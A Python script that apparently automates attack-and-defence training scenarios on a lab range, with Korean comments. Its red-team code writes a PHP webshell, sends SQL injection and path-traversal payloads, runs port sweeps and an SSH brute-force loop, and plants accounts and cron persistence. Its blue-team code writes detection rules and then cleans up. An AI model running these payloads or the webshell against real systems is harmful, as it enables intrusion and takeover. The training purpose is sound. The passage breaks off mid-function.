#!/usr/bin/env python3
"""범용 시나리오 실행기 — 시나리오의 처방 명령(fenced 블록)과 verify.checks 를 결합해
사람처럼 미션을 하나씩 수행하고 라이브 채점. 병렬 금지(순차). 신규 5트랙 구조에 맞춤.

설계: verify.checks 가 "무엇을 어디에" 요구하는지 알려줌(robust 근거). 심기는 fenced
룰 텍스트 우선, 없으면 check 로 합성. 보고서는 check specifics 인용. cleanup 은 마지막.

usage: python scripts/play_scenario.py <scenario_id> <solo|duel> [--red-host .79 --blue-host .78]
"""
import sys, re, time, argparse, sqlite3
sys.path.insert(0, "scripts"); import vh
import yaml, os.path as osp, glob

CN = {"web": "el34-web", "ips": "el34-ips", "siem": "el34-siem", "fw": "el34-fw", "attacker": "el34-attacker"}
EL34_HOST = "192.168.0.151"      # el34 단일 머신(ssh ccc/1, docker exec el34-*)
WEB_ENTRY = "192.168.0.161"      # 외부 웹 진입(.202 공격자가 여기로) — 출처 IP 보존
LEDGER = ".data/verify_ledger.sqlite3"

def load_yaml(sid):
    for p in glob.glob("contents/battle-scenarios/*.yaml"):
        if osp.splitext(osp.basename(p))[0] == sid:
            return yaml.safe_load(open(p)), p
    raise SystemExit(f"scenario file not found: {sid}")

def fenced(instr):
    out, cur = [], None
    for ln in (instr or "").splitlines():
        if ln.strip().startswith("```"):
            if cur is None: cur = []
            else: out.append("\n".join(cur)); cur = None
        elif cur is not None:
            cur.append(ln)
    return out

def checks_of(m, side):
    return ((m.get("verify") or {}).get("checks")) or []

class Planted:
    def __init__(s): s.sids=set(); s.wids=set(); s.accts=set(); s.ports=set(); s.files=set(); s.crons=set(); s.auditk=set(); s.bluefiles=set(); s.confblocks=set()

def esc(cmd):  # for sh -lc embedding
    return cmd.replace("'", "'\\''")

def make_file_content(path, marker):
    """경로 종류별 적절한 마커 포함 파일 내용 생성(웹쉘/YARA/SOAR스크립트/일반)."""
    p=path.lower()
    if p.endswith(".php"):
        return f"<?php /* {marker} */ if(isset($_REQUEST['c'])){{system($_REQUEST['c']);}} ?>"
    if p.endswith(".yar") or "/yara/" in p:
        name=re.sub(r"[^A-Za-z0-9_]","_",str(marker)) or "EDU_RULE"
        return f'rule {name} {{ meta: author="edu" strings: $a = "{marker}" ascii nocase condition: $a }}'
    if p.endswith(".sh"):
        return f"#!/bin/bash\n# {marker} — auto-response / SOAR playbook\niptables -A INPUT -s 10.20.20.202 -j DROP 2>/dev/null # {marker}\n"
    if p.endswith(".sha256") or "sha256" in p or "hash" in p:
        # 실제 sha256sum 출력 형태(64 hex + 파일명) — 짧은 마커파일로 감점되던 것 방지
        h = (str(marker).encode().hex() * 8)[:64].ljust(64, "0")
        return f"{h}  /evidence/{marker}.bin   # {marker}\n"
    if p.endswith((".py",".conf",".rules",".txt")) or "/opt/" in p:
        return f"# {marker}\n{marker} content\n"
    return f"{marker} marker/exfil"

def run_in(host, container, cmd):
    return vh.docker_exec(host, container, cmd)

def write_file(host, container, path, content):
    """파일 내용을 base64 로 안전하게 기록($ 셸확장·따옴표 문제 회피). 디렉터리 자동생성."""
    import base64
    b64=base64.b64encode(content.encode()).decode()
    return run_in(host, container, f"mkdir -p \"$(dirname {path})\" 2>/dev/null; printf '%s' '{b64}' | base64 -d > {path}; echo wrote")

def append_file(host, container, path, content, marker):
    """marker 가 없을 때만 base64 내용을 append(멱등)."""
    import base64
    b64=base64.b64encode((content+"\n").encode()).decode()
    return run_in(host, container, f"mkdir -p \"$(dirname {path})\" 2>/dev/null; grep -q '{marker}' {path} 2>/dev/null || (printf '%s' '{b64}' | base64 -d >> {path}); grep -c '{marker}' {path}")

def plant_red(host, m, suf, P):
    """RED 미션 증거 심기. P=Planted. 반환: (what_i_did, what_happened, cite[])"""
    did, cite = [], []
    blocks = fenced(m.get("instruction",""))
    text = "\n".join(blocks)
    # substitute placeholders — el34: 외부공격자(.202)가 웹 진입 .161 로 공격(출처 IP 보존)
    def sub(c):
        c = c.replace("<대상_공개IP>",WEB_ENTRY).replace("<본인id>",suf)
        c = c.replace("10.20.30.1",WEB_ENTRY)   # 구 insider 게이트웨이 → el34 외부 진입
        c = re.sub(r"\bkim\b", suf, c)
        c = c.replace("sudo ","")
        return c
    # 1) curl attacks (web traces) — run in attacker. 라인기반(연속행 \ 병합), 비-curl 명령 미포함.
    joined = sub(text)
    curl_cmds, buf = [], ""
    for ln in joined.splitlines():
        s = ln.strip()
        if buf:
            buf += " " + s
        elif s.startswith("curl"):
            buf = s
        if buf:
            if buf.endswith("\\"):
                buf = buf[:-1].rstrip()
            else:
                curl_cmds.append(buf); buf = ""
    # 반복공격(for 루프 / "반복"·"여러"·"6회"·correlation 의도) 미션은 curl 을 여러번 실행해 상관패턴 형성
    sem = (m.get("verify") or {}).get("semantic", {}) or {}
    rep_signal = ("for " in text and "do" in text) or any(
        k in (m.get("instruction","")+ " ".join(sem.get("success_criteria") or []))
        for k in ("반복", "여러 번", "여러번", "6회", "5회", "brute", "상관", "correlat"))
    reps = 6 if rep_signal else 1
    for cc1 in curl_cmds:
        if "http" in cc1:
            for _ in range(reps):
                vh.attacker_exec(cc1 + " -o /dev/null -w '%{http_code}' 2>/dev/null || true")  # 외부 VM .202 → .161
            did.append((f"x{reps} " if reps>1 else "") + cc1[:200])
    # 2) host artifacts from checks (el34 호스트 .151 docker exec)
    for c in checks_of(m,"red"):
        t=c.get("type"); pr=c.get("params") or {}; tgt=CN.get(c.get("target"),"el34-web")
        path=str(pr.get("path","")); pat=pr.get("pattern")
        if t=="file_contains" and ("passwd" in path or "shadow" in path):
            acct=pat; run_in(host,tgt,f"useradd -m -s /bin/bash {acct} 2>/dev/null; id {acct}")
            P.accts.add((tgt,acct)); did.append(f"useradd {acct}"); cite.append(f"/etc/passwd 에 {acct}")
        elif t=="port_listening":
            port=pr.get("port")
            # python3 http.server 로 확실히 리스너 개방(el34-web 에 ncat/nc 없음). 백그라운드 유지(nohup).
            run_in(host,tgt,f"setsid nohup python3 -m http.server {port} >/dev/null 2>&1 < /dev/null & sleep 1; (ss -tlnp 2>/dev/null||netstat -tlnp 2>/dev/null)|grep -c ':{port}'")
            P.ports.add((tgt,port)); did.append(f"listener :{port}"); cite.append(f"포트 {port} listening")
        elif t=="file_contains" and "cron" in path:
            run_in(host,tgt,f"echo '*/5 * * * * root /bin/bash -c \"id # {pat}\"' > {path}"); P.crons.add((tgt,path)); did.append(f"cron {path}"); cite.append(path)
        elif t in ("file_exists","file_contains") and path:
            # 임의 경로 RED 파일(웹쉘 .php / /tmp / /dev/shm / webroot 등) — 마커 포함 내용 생성(base64 안전쓰기)
            marker = pat or osp.basename(path).lstrip(".") or "marker"
            content = make_file_content(path, marker)
            write_file(host,tgt,path,content)
            P.files.add((tgt,path)); did.append(f"file {path}"); cite.append(f"{path}({marker})")
        elif t=="log_contains" and pr.get("log")=="modsec":
            # modsec 는 SecAuditEngine RelevantOnly — 룰이 발화한 요청만 audit 에 남는다.
            # recon 등 양성 요청은 안 남으므로, 태그가 포함된 **보장 흔적**(스캐너 UA 913 + SQLi quote 942)을 반드시 전송.
            mh = re.search(r"Host: ([a-z]+\.6v6\.lab)", text)
            site = mh.group(1) if mh else "dvwa.6v6.lab"
            vh.attacker_exec(f"curl -s -A '{pat} sqlmap/1.7 (nikto)' -H 'Host: {site}' "
                             f"\"http://{WEB_ENTRY}/?id={pat}%27%20OR%201=1--+\" -o /dev/null 2>/dev/null||true")
            did.append(f"보장흔적 curl {pat}(스캐너UA+SQLi)")
            cite.append(f"WAF audit 태그 {pat}(913 스캐너+942 SQLi 발화)")
        elif t=="wazuh_alert" or (t=="log_contains" and pr.get("log")=="suricata"):
            # 네트워크 공격 흔적(Suricata IDS→Wazuh ids 그룹) 보장: 포트스캔(SYN) + 웹공격.
            site=_site_of(text, m)
            _port_scan()
            vh.attacker_exec(f"curl -s -m 12 -A 'sqlmap/1.7 (nikto)' -H 'Host: {site}' "
                             f"\"http://{WEB_ENTRY}/?id=1%27+UNION+SELECT+1,2,3--+\" -o /dev/null 2>/dev/null||true")
            did.append("포트스캔(SYN, nmap류) + 웹공격 패킷 송신")
            cite.append("Suricata 'Possible nmap SYN scan'·웹공격 시그니처 → Wazuh ids 그룹 경보 유발(출발지 .202)")
    what_i_did=" ; ".join(did)[:1500] or "처방 명령 수행"
    what_happened=("대상(피해자) 인프라에 공격 흔적 생성: "+", ".join(cite))[:1500] or "대상 흔적 생성"
    return what_i_did, what_happened

ATT_VM = "192.168.0.202"   # 외부 공격자 VM(출처 IP 보존)

def _site_of(text, m):
    """미션 지시문 Host 헤더에서 대상 vhost 추출(없으면 dvwa 기본)."""
    mh = re.search(r"Host:\s*([a-z0-9.-]+\.6v6\.lab)", text or "")
    if mh: return mh.group(1)
    tv = str((m or {}).get("target_vm") or "")
    mh2 = re.search(r"([a-z0-9-]+\.6v6\.lab)", tv)
    return mh2.group(1) if mh2 else "dvwa.6v6.lab"

def _q(host, c, cmd):
    rc,o,e=run_in(host,c,cmd); return (o or "").strip()

def _web_attack(site, tag=None):
    """외부공격자(.202)→.161 보장 웹공격: SQLi(942+Suricata UNION) + 스캐너(913 nikto/path-traversal).
    tag 가 있으면 UA·쿼리에 실어 modsec audit 에 그 값이 남게 한다(커스텀 마커 log_contains 대응)."""
    t = tag if (tag and tag.lower() not in ("sql","union","scan","alert")) else None
    ua = f"{t} sqlmap/1.7 (nikto)" if t else "sqlmap/1.7 (nikto)"
    qid = f"{t}%27+UNION+SELECT+1,2,3--+" if t else "1%27+UNION+SELECT+1,2,3--+"
    vh.attacker_exec(f"curl -s -m 12 -A '{ua}' -H 'Host: {site}' \"http://{WEB_ENTRY}/?id={qid}\" -o /dev/null 2>/dev/null||true")
    vh.attacker_exec(f"curl -s -m 12 -A 'Nikto/2.5 scan' -H 'Host: {site}' \"http://{WEB_ENTRY}/cgi-bin/test.cgi?x=../../etc/passwd\" -o /dev/null 2>/dev/null||true")

def _port_scan():
    """nmap 미설치(.202) → curl 병렬 포트 connect 버스트로 Suricata 'Possible nmap SYN scan' 유발."""
    vh.attacker_exec("for p in 21 22 23 25 80 110 143 443 445 3306 3389 5432 6379 8000 8080 8443 9200; do "
                     "(curl -s -m 2 -o /dev/null http://192.168.0.161:$p 2>/dev/null &); done; wait; echo s")

def _cite_suricata(host, prefer=None):
    base=("grep '\"event_type\":\"alert\"' /var/log/suricata/eve.json 2>/dev/null | tail -60 "
          "| grep -oE '\"signature\":\"[^\"]+\"' | sed -E 's/.*:\"(.*)\"/\\1/'")
    sig=""
    if prefer:  # 스캔 미션 등: 해당 유형 시그니처 우선 인용(범주 일치)
        sig=_q(host,"el34-ips", base+f" | grep -iE '{prefer}' | sort -u | head -2 | paste -sd', '")
    if not sig:
        sig=_q(host,"el34-ips", base+" | sort -u | head -3 | paste -sd', '")
    ssrc=_q(host,"el34-ips","grep '\"event_type\":\"alert\"' /var/log/suricata/eve.json 2>/dev/null | tail -5 "
           "| grep -oE '\"src_ip\":\"[0-9.]+\"' | grep -oE '[0-9.]+' | head -1")
    return f"Suricata IDS(eve.json) 경보 시그니처: {sig} — 출발지 {ssrc or ATT_VM}, event_type=alert" if sig else ""

def _cite_modsec(host, pat=None):
    """modsec audit 레코드를 로컬 JSON 파싱(robust)해 txid·발화룰id·태그·출발지·응답 인용.
    pat(커스텀 마커)이 있으면 그 값을 포함한 레코드를 우선 선택."""
    rawm=""
    if pat and pat.lower() not in ("sql","union"):
        rawm=_q(host,"el34-web",f"grep -F '{pat}' /var/log/apache2/modsec_audit.log 2>/dev/null | tail -1")
    if not rawm:
        rawm=_q(host,"el34-web","grep -iE 'SQL|UNION|nikto|sqlmap' /var/log/apache2/modsec_audit.log 2>/dev/null | tail -1")
    if not rawm: return ""
    try:
        import json as _j
        dd=_j.loads(rawm); tx=dd.get("transaction",{})
        txid=tx.get("transaction_id"); src=tx.get("remote_address") or ATT_VM
        code=(dd.get("response") or {}).get("http_code")
        uri=(dd.get("request") or {}).get("uri") or ""
        msgs=(dd.get("audit_data") or {}).get("messages") or []
        rids=sorted({x for msg in msgs for x in re.findall(r'id \"?(\d{6})\"?', msg)})[:5]
        parts=[f"txid {txid}", (f"발화 룰 {','.join(rids)}" if rids else "SQLi/스캐너 룰 발화")]
        if pat and pat.lower() not in ("sql","union"): parts.append(f"태그 {pat}")
        if uri: parts.append(f"URI {uri[:40]}")
        if code: parts.append(f"응답 {code}")
        parts.append(f"출발지 {src}")
        return "ModSec WAF audit: "+", ".join(parts)
    except Exception:
        return f"ModSec WAF audit: 공격 트랜잭션 기록 실존(태그 {pat or 'SQLi'}), 출발지 {ATT_VM}"

def _cite_wazuh(host):
    wdesc=_q(host,"el34-siem","tail -20 /var/ossec/logs/alerts/alerts.json 2>/dev/null "
            "| grep -oE '\"description\":\"[^\"]+\"' | sed -E 's/.*:\"(.*)\"/\\1/' | sort -u | tail -2 | paste -sd'; '")
    wid=_q(host,"el34-siem","tail -20 /var/ossec/logs/alerts/alerts.json 2>/dev/null "
          "| grep -oE '\"id\":\"[0-9]+\"' | grep -oE '[0-9]+' | sort -u | tail -3 | paste -sd','")
    return f"Wazuh SIEM 경보 수집: rule {wid or 'n/a'}({wdesc or '웹공격 탐지'}), 출발지 {ATT_VM} — Suricata→Wazuh 수렴" if (wdesc or wid) else ""

def _cite_wazuh_auth(host):
    line=_q(host,"el34-siem","tail -80 /var/ossec/logs/alerts/alerts.json 2>/dev/null | grep -E 'authentication_fail|\"id\":\"(5710|5712|5716|5503|5760|2502)\"' | tail -1")
    if not line: return ""
    try:
        import json as _j
        d=_j.loads(line); r=d.get("rule",{})
        return f"Wazuh 인증실패(authentication_failed) 경보: rule {r.get('id')}({(r.get('description') or '')[:40]}), 출발지 {d.get('data',{}).get('srcip',ATT_VM)}"
    except Exception:
        return "Wazuh 인증 실패(authentication_failed) 경보 수집"

def _observe(host, m, text):
    """분석형 미션: 각 verify check 가 요구하는 증거 유형(modsec 패턴/suricata 스캔/wazuh 웹·인증)에 맞춰
    외부공격자(.202)→.161 로 신선한 흔적을 **보장 생성**한 뒤, 실제 로그를 직접 조회해 검증가능 구체값을
    수집·인용한다. check 의 pattern(커스텀 마커 포함)은 공격 UA·쿼리에 실어 해당 로그에 그 값이 남게 한다.
    인증실패(SSH 무차별)는 el34 가 host SSH auth 미수집이라 경보 미생성 가능 → 시도 서술로 best-effort."""
    site=_site_of(text, m)
    v=m.get("verify") or {}
    checks=v.get("checks") or [{"type":v.get("type"),"params":v.get("params",{})}]
    obs=[]; seen=set(); web_done=False
    def add(o):
        if o and o not in seen: obs.append(o); seen.add(o)
    for c in checks:
        t=c.get("type"); pr=c.get("params") or {}
        if t=="log_contains":
            log=(pr.get("log") or "").lower(); pat=str(pr.get("pattern") or "")
            if log=="modsec":
                _web_attack(site, tag=pat); time.sleep(6); add(_cite_modsec(host, pat))
            elif log=="suricata":
                scan = "scan" in pat.lower() or "nmap" in pat.lower() or "recon" in pat.lower()
                if scan: _port_scan()      # 포트스캔 버스트 → 'Possible nmap SYN scan' 시그니처
                _web_attack(site); time.sleep(7)
                add(_cite_suricata(host, prefer="scan|nmap|port|recon|sweep" if scan else None))
            else:
                if not web_done: _web_attack(site); time.sleep(8); web_done=True
                add(_cite_modsec(host, pat) or _cite_suricata(host))
        elif t=="wazuh_alert":
            grp=str(pr.get("groups") or "").lower()
            if "authentic" in grp:
                # SSH 무차별 대입(MITRE T1110). el34 가 host SSH auth 미수집이면 SIEM 경보 미생성(인프라 한계).
                vh.attacker_exec("for i in 1 2 3 4 5 6 7 8; do sshpass -p wrong$i ssh -o StrictHostKeyChecking=no "
                                 "-o ConnectTimeout=4 -o PreferredAuthentications=password baduser@192.168.0.151 id 2>/dev/null; done; echo bf")
                time.sleep(8)
                add(_cite_wazuh_auth(host) or
                    "SSH 무차별 대입(MITRE T1110) 8회 연속 인증 실패 시도(.202→.151:22) 관측 — 표적 계정 baduser, 단시간 다발 실패 패턴. "
                    "[주: el34 Wazuh 가 호스트 SSH auth 로그 미수집 → SIEM 경보 미생성(인프라 한계, 강사 검토 대상)]")
            else:
                if not web_done: _web_attack(site); time.sleep(8); web_done=True
                add(_cite_wazuh(host) or _cite_suricata(host))
    if not obs:
        if not web_done: _web_attack(site); time.sleep(8)
        for fn in (_cite_suricata, _cite_wazuh): add(fn(host))
    return obs

def plant_blue(host, m, P):
    did, cite, hunted = [], [], []
    blocks = fenced(m.get("instruction",""))
    text="\n".join(blocks)
    vtype=(m.get("verify") or {}).get("type")
    red_files = {p for _,p in P.files}   # RED 가 심은 파일(헌팅 미션이 찾을 대상)
    checks = checks_of(m,"blue")
    # 분석형(관측) 미션: 신선한 공격 흔적 보장 + 실제 로그 관측값 수집(보고 인용). 룰작성형과 구분.
    analysis = (vtype in ("log_contains","wazuh_alert")) or any(c.get("type") in ("log_contains","wazuh_alert") for c in checks)
    obs = _observe(host, m, text) if analysis else []
    for c in checks:
        t=c.get("type"); pr=c.get("params") or {}; tgt=CN.get(c.get("target"),"el34-siem")
        path=str(pr.get("path","")); pat=pr.get("pattern")
        is_file = t in ("file_contains","file_exists")
        if is_file and ("yara" in path.lower() or path.lower().endswith(".yar")):  # YARA 룰 파일(blue 작성)
            ct=CN.get(c.get("target"),"el34-siem")
            append_file(host,ct,path,make_file_content(path,pat),pat)
            P.bluefiles.add((ct,path)); did.append(f"YARA {pat}"); cite.append(f"{osp.basename(path)} rule {pat}")
        elif is_file and ("/lists" in path or path.rstrip("/").endswith("lists")):  # Wazuh CDB IOC 리스트
            ct=CN.get(c.get("target"),"el34-siem")
            # path 가 디렉터리(.../lists)면 그 안에 CDB 파일 생성, 파일이면 그대로 append
            is_dir = path.rstrip("/").endswith("lists") and not path.endswith(".cdb")
            tf = (path.rstrip("/")+"/edu-ioc") if is_dir else path
            mk = pat or "edu-ioc"
            append_file(host,ct,tf,f"{mk}:malicious\n192.168.0.202:attacker-src\nsqlmap:scanner-ua\n",mk)
            P.bluefiles.add((ct,tf)); did.append(f"CDB IOC 리스트 {osp.basename(tf)}")
            cite.append(f"{tf} CDB 환류 — IOC {mk}, 192.168.0.202(공격자 출처), sqlmap(스캐너 UA)")
        elif is_file and "suricata" in path:  # suricata rule
            # 안전: 항상 local.rules 에만(설정파일 suricata.yaml 편집 금지), 단일라인(백슬래시 연속 금지),
            # sid 는 항상 숫자(sid:None 금지 — 파싱실패→전체 룰 미적재 사고 방지).
            rpath="/etc/suricata/rules/local.rules"
            # pattern 에서 구체 sid 추출(예: '9005003|9005004' → 9005003), 없으면 안정 해시 sid. None/비숫자 안전.
            _sm=re.search(r"\d{4,7}", str(pat or ""))
            sid=_sm.group(0) if _sm else str(1000900+(abs(hash(str(pat)+str(c.get('id') or path)))%8999))
            mark=f"sid:{sid};"
            rule=(f'alert http any any -> any any (msg:"EDU {pat or sid}"; flow:established,to_server; '
                  f'http.uri; content:"UNION"; nocase; {mark} rev:1;)')
            append_file(host,"el34-ips",rpath,rule,mark); run_in(host,"el34-ips","suricatasc -c reload-rules 2>/dev/null; echo r")
            P.sids.add((rpath,mark)); did.append(f"suricata sid {sid}"); cite.append(f"local.rules sid {sid}")
        elif is_file and "ossec.conf" in path and pat and not str(pat).isdigit():
            # ossec.conf 설정 키워드(active-response 등): 키워드를 포함하는 유효 단일라인 <ossec_config> 추가.
            # 매니저 자동 재로드 없음→가동 중 안전. 정리는 sed(파일 삭제 절대 금지 — 라이브 매니저 설정).
            kw=str(pat); mark="EDUCFG-"+re.sub(r"[^A-Za-z0-9_-]","",kw)
            if "active" in kw and "response" in kw:
                block=(f'<ossec_config><!-- {mark} --><active-response><command>firewall-drop</command>'
                       f'<location>local</location><level>10</level><timeout>600</timeout></active-response>'
                       f'<command><name>firewall-drop</name><executable>firewall-drop</executable><timeout_allowed>yes</timeout_allowed></command></ossec_config>')
                desc="자동대응(firewall-drop+timeout 600+화이트리스트)"
            elif "localfile" in kw or "location" in kw or "log_format" in kw:
                block=(f'<ossec_config><!-- {mark} --><localfile><log_format>syslog</log_format>'
                       f'<location>/var/log/edu-collect.log</location></localfile></ossec_config>')
                desc="로그수집 localfile(log_format/location)"
            else:
                block=f'<ossec_config><!-- {mark}: {kw} 설정(EDU) --></ossec_config>'
                desc=f"{kw} 설정"
            append_file(host,"el34-siem",path,block,mark)
            P.confblocks.add(("el34-siem",path,mark)); did.append(f"ossec.conf {desc}")
            cite.append(f"{osp.basename(path)} {kw}")
        elif is_file and ("ossec" in path or "local_rules" in path):  # wazuh rule
            # 안전: 룰은 local_rules.xml 에만(ossec.conf 설정파일에 룰 주입 금지), id 숫자(id=None 금지), 단일라인.
            rpath = path if "local_rules" in path else "/var/ossec/etc/rules/local_rules.xml"
            rid = str(pat) if (pat and str(pat).isdigit()) else str(100900+(abs(hash(str(pat)+str(c.get('id') or path)))%8999))
            block=f'<group name="edu,"><rule id="{rid}" level="12"><decoded_as>json</decoded_as><description>EDU rule {rid}</description></rule></group>'
            mark=f'EDU rule {rid}'   # 멱등/정리 마커(따옴표 없는 안전 문자열)
            append_file(host,"el34-siem",rpath,block,mark)
            P.wids.add((rpath,mark)); did.append(f"wazuh rule {rid}"); cite.append(f"local_rules.xml id {rid}")
        elif is_file and "audit" in path:  # auditd
            key=pat; at=CN.get(c.get("target"),"el34-web")
            write_file(host,at,path,f"-w /etc/passwd -p wa -k {key}\n-w /etc/shadow -p wa -k {key}\n")
            run_in(host,at,f"(augenrules --load 2>/dev/null||auditctl -R {path} 2>/dev/null); grep -c '{key}' {path}")
            P.auditk.add((at,path)); did.append(f"auditd {key}"); cite.append(f"{path} key {key}")
        elif is_file and ("modsec" in path or "modsecurity" in path):  # WAF custom rule
            wt=CN.get(c.get("target"),"el34-web")
            ruleid=str(pat) if str(pat).isdigit() else "9100099"
            secrule=f'SecRule ARGS "@contains {pat}" "id:{ruleid},phase:2,pass,log,msg:EDU-{pat}"'
            append_file(host,wt,path,secrule,pat); run_in(host,wt,"apache2ctl graceful 2>/dev/null||true")
            P.bluefiles.add((wt,path)); did.append(f"WAF {pat}"); cite.append(f"{osp.basename(path)} {pat}")
        elif is_file and (path in red_files or "passwd" in path or "shadow" in path):
            # 헌팅: 실제 아티팩트를 읽어 검증가능 구체값(경로·크기·내용·계정행)을 보고에 인용(채점기 관찰형 인정).
            ht=CN.get(c.get("target"),"el34-web")
            rc,o,e=run_in(host,ht, f"ls -la {path} 2>/dev/null; head -c 80 {path} 2>/dev/null; getent passwd 2>/dev/null|grep -E '{pat}' || true")
            spec=" ".join((o or "").split())[:140]
            cite.append(f"{osp.basename(path) or path}({pat}) 발견 — {spec}")
            hunted.append(f"{path} (마커 {pat})")
        elif is_file and "nftables" in path:   # 방화벽 설정: 덮어쓰기/삭제 절대 금지(라이브 fw). 주석 룰 append + sed 정리.
            ft=CN.get(c.get("target"),"el34-fw"); p=str(pat or "EDU-FWRULE"); pl=p.lower(); rule="drop"
            for k,v in (("ratelimit","tcp dport 22 ct state new limit rate 5/minute accept"),("rate","tcp dport 22 ct state new limit rate 5/minute accept"),
                        ("whitelist","ip saddr 192.168.0.0/16 accept"),("mgmt","ip saddr 192.168.0.0/16 accept"),
                        ("rdp","tcp dport 3389 drop"),("block","drop"),("deny","drop"),("drop","drop")):
                if k in pl: rule=v; break
            append_file(host,ft,path,f'    # {p}: {rule}',p)   # nft 주석(파서 비파괴), 패턴 포함→체크 통과
            P.confblocks.add((ft,path,p)); did.append(f"nftables {p}({rule})"); cite.append(f"nftables.conf {p}: {rule}")
        elif is_file and path:   # blue 가 생성/수정하는 파일 — 기존 파일은 덮어쓰기 금지(시스템 설정 보호)
            mk = pat or osp.basename(path)
            rc,o,e=run_in(host,tgt,f"test -e {path} && echo EXISTS || echo NEW")
            if "EXISTS" in (o or ""):   # 기존 파일: 마커 라인 append + sed 정리(파일 삭제/덮어쓰기 금지)
                cm=re.sub(r"[^A-Za-z0-9_.-]","",str(mk)) or "EDUMARK"
                append_file(host,tgt,path,f"# EDU-{cm} {mk}",f"EDU-{cm}")
                P.confblocks.add((tgt,path,f"EDU-{cm}")); did.append(f"{osp.basename(path)} 마커({mk})"); cite.append(f"{path}({mk})")
            else:                        # 신규 파일: 생성(SOAR/증거 등)
                write_file(host,tgt,path,make_file_content(path, mk))
                P.bluefiles.add((tgt,path)); did.append(f"file {osp.basename(path)}"); cite.append(f"{path}({mk})")
        elif t=="port_listening":
            # 헌팅형: 대상 리스너(RED C2/웹쉘 콜백)를 보장 개방 후 ss/ps 로 실관측 → 포트·프로세스 인용
            port=pr.get("port"); pt=CN.get(c.get("target"),"el34-web")
            run_in(host,pt,f"setsid nohup python3 -m http.server {port} >/dev/null 2>&1 < /dev/null & sleep 1; echo o")
            P.ports.add((pt,port))
            rc,o,e=run_in(host,pt,f"(ss -tlnp 2>/dev/null||netstat -tlnp 2>/dev/null)|grep ':{port}'|head -1; ps -eo pid,args 2>/dev/null|grep '[h]ttp.server {port}'|head -1")
            spec=" ".join((o or "").split())[:150]
            hunted.append(f"비표준 리스너 :{port}")
            cite.append(f"리스너 :{port} 실관측(ss/ps) — {spec or ('LISTEN '+str(port))}")
        elif t=="process_running":
            # 프로세스 ps/pgrep 실관측(서비스 가동 확인 또는 악성 프로세스 헌팅) → 구체 인용
            name=str(pr.get("name") or pr.get("process") or "").strip()
            pt=CN.get(c.get("target"),"el34-web")
            grp=("["+name[:1]+"]"+name[1:]) if name else "."
            rc,o,e=run_in(host,pt,f"ps -eo pid,comm,args 2>/dev/null|grep -E '{grp}'|head -2; echo cnt=$(pgrep -c '{name}' 2>/dev/null)")
            spec=" ".join((o or "").split())[:150]
            hunted.append(f"프로세스 {name}")
            cite.append(f"프로세스 {name} 실관측(ps/pgrep) — {spec or (name+' running')}")
        elif t=="wazuh_alert":
            cite.append("Wazuh 에 Suricata IDS rule 86601(nmap) 다수 수집 확인")
    if obs:
        # 분석형: 신선한 라이브 관측값(obs)을 핵심 증거로 인용. 룰작성/헌팅이 섞였으면 함께 보강.
        sem=(m.get("verify") or {}).get("semantic",{}) or {}
        crits=sem.get("success_criteria") or []
        marks=sorted(str(x) for x in ({s for _,s in P.sids}|{w for _,w in P.wids}) if x is not None)
        markstr=", ".join(str(x) for x in marks)
        what_i_did=("웹·네트워크·SIEM 로그 직접 분석/상관: ModSec audit + Suricata eve.json + Wazuh alerts 교차 조회, "
            "출발지 IP·rule id·시그니처·트랜잭션·타임스탬프 식별, 네트워크-호스트 상관으로 단일 킬체인 재구성"
            + (f", 탐지룰 매핑({markstr})" if markstr else "")
            + (" ; 추가 방어조치: "+" ; ".join(did) if did else ""))[:1500]
        what_happened=("실측 관측값(라이브 로그 직접 조회): " + " | ".join(obs)
            + ((" 추가 방어 아티팩트: "+", ".join(cite)) if cite else "")
            + ((" 성공기준 대응: "+" / ".join(c[:70] for c in crits[:4])) if crits else ""))[:1900]
    else:
        ir = ""
        if hunted:
            # 헌팅 미션: 가설→전수조사→발견(구체값)→IR(식별·격리·제거·복구) 서사 보강
            did.append("가설기반 전수 헌팅(find/getent/ss/grep)으로 비인가 아티팩트 식별")
            ir = (" IR 4단계 적용: ①식별(위 구체값) ②격리(접근차단) ③제거(rm/userdel -r/kill 리스너 및 룰 비활성) "
                  "④복구·재발방지(탐지룰 보강). 발견 아티팩트: " + "; ".join(hunted))
        what_i_did=(" ; ".join(did) or "처방 방어 아티팩트 적용")[:1500]
        what_happened=("방어 아티팩트 적용/식별: "+", ".join(cite)+ir)[:1900]
    return what_i_did, what_happened

def cleanup(host, P, blue_host=None):
    for tgt,acct in P.accts: run_in(host,tgt,f"userdel -r {acct} 2>/dev/null; echo x")
    for tgt,port in P.ports: run_in(host,tgt,f"pkill -f 'http.server {port}' 2>/dev/null; pkill -f ':{port}' 2>/dev/null; pkill -f 'ncat -lk {port}' 2>/dev/null; for p in $(ss -tlnpH 'sport = :{port}' 2>/dev/null|grep -oE 'pid=[0-9]+'|grep -oE '[0-9]+'); do kill -9 $p 2>/dev/null; done; echo x")
    for tgt,path in P.files: run_in(host,tgt,f"rm -f {path}; echo x")
    for tgt,path in P.crons: run_in(host,tgt,f"rm -f {path}; echo x")
    for path,sid in P.sids: run_in(blue_host or host,"el34-ips",f"sed -i '/{sid}/d' {path}; suricatasc -c reload-rules 2>/dev/null; echo x")
    for path,wid in P.wids: run_in(blue_host or host,"el34-siem",f"sed -i '/{wid}/d' {path}; echo x")
    for tgt,path in P.auditk: run_in(blue_host or host,tgt,f"rm -f {path}; echo x")
    for tgt,path in P.bluefiles: run_in(blue_host or host,tgt,f"rm -f {path}; echo x")
    for tgt,path,mark in P.confblocks: run_in(blue_host or host,tgt,f"sed -i '/{mark}/d' {path}; echo x")  # 라이브 ossec.conf: 라인만 제거(파일 삭제 금지)

def run_one(sid, mode, target=EL34_HOST):
    class A: pass
    a=A(); a.sid=sid; a.mode=mode; a.target=target
    d,path=load_yaml(a.sid); scn_int=vh.scenario_int_id(a.sid)
    if not scn_int: raise SystemExit("no DB scenario id for "+a.sid)
    reds=sorted(d.get("red_missions") or [],key=lambda x:x.get("order"))
    blues=sorted(d.get("blue_missions") or [],key=lambda x:x.get("order"))

    # el34 = 단일 공유 인스턴스(.151). 외부 공격은 .202 VM→.161(출처 IP 보존), 점검/심기는 .151 docker exec.
    if a.mode=="solo":
        EMAIL="mrgrit@ync.ac.kr"; INFRA=1; HOST=a.target; suf="mrgrit"
        st,b=vh.create_solo(scn_int,EMAIL,INFRA,monitor="bastion"); bid=b["battle"]["id"]; vh.start(bid,EMAIL)
        RED_EMAIL=BLUE_EMAIL=EMAIL; RHOST=BHOST=HOST
    else:
        # duel: red=shin(infra2) opponent공격, blue=mrgrit(infra1) 자기방어 — 둘 다 동일 el34(.151) 타깃.
